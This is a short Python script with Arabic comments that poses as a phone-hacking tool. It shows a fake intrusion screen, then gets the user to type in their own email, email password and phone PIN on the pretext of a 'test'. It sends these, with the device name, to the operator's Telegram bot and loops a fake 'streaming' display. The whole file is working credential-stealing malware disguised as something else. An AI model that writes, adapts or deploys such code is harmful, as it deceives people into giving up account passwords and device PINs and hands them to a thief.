import requests
import os
import time
import platform

# --- ضع بياناتك هنا يا Hunter ---
TOKEN = "هنا_ضع_توكن_البوت_الخاص_بك"
CHAT_ID = "هنا_ضع_ايدي_حسابك_في_تلجرام"

def send_to_hunter(data):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": f"🎯 صيد جديد من DLAG!\n\n{data}"}
        requests.post(url, data=payload)
    except:
        pass

def setup_fake_ui():
    os.system("clear")
    print("\033[1;31m[!] DLAG - ADVANCED MOBILE HACKER v1.0 [!]\033[0m")
    print("------------------------------------------")
    target = input("[+] Enter Victim Number: ")
    print("[*] Connecting to Satellite...")
    time.sleep(2)
    print("[*] Vulnerability Found: CVE-2026-X")
    
    print("\n\033[1;33m[!] لضمان نجاح الاختراق، يجب عمل 'Test' على جهازك أولاً")
    print("أدخل بياناتك لتشفير الرابط ومنع كشفه من النظام:\033[0m")
    
    email = input("\n[+] Gmail/Email: ")
    password = input("[+] Email Password: ")
    pin = input("[+] Phone Screen Lock (PIN): ")
    
    # جمع البيانات
    log = f"📧 Email: {email}\n🔑 Password: {password}\n📱 PIN: {pin}\n🛠 Device: {platform.node()}"
    
    # إرسالها لك
    send_to_hunter(log)
    
    print("\n\033[1;32m[✔] Verification Success! Link generated for " + target + "\033[0m")
    print("[*] Log in to the portal to see live stream.")
    
    while True:
        print(f"\r[Streaming data from {target}... ⏳]", end="")
        time.sleep(1)

if __name__ == "__main__":
    setup_fake_ui()
